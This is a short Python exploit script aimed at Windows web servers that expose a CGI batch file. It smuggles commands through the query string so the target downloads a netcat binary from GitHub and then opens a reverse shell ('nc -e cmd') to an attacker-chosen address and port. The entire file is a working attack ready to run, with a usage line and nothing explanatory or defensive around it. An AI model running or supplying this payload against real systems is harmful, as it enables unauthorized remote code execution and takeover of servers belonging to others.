import sys, requests
from time import sleep
attackerAddr = 'your attack addr'
attackerPort = 1 # your listening port
downloadNC = '&C%3A%5CWindows%5CSystem32%5Ccurl+https://raw.githubusercontent.com/int0x33/nc.exe/master/nc64.exe+--output+ncNC.exe'
ncRevershell = f'ncNC.exe+-e+cmd+{attackerAddr}+{str(attackerPort)}'
payload = '{}/cgi-bin/{}?&{}'

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print('Usage: python3 exploit_script.py <target_url> <bat_name>`')
        exit()
    target_url = sys.argv[1]
    bat_name = sys.argv[2]
    print('http://'+payload.format(target_url,bat_name,downloadNC))
    r = requests.get('http://'+payload.format(target_url,bat_name,downloadNC), timeout=3)
    sleep(4)
    print('http://'+payload.format(target_url,bat_name,ncRevershell))
    
    r = requests.get('http://'+payload.format(target_url,bat_name,ncRevershell), timeout=3)
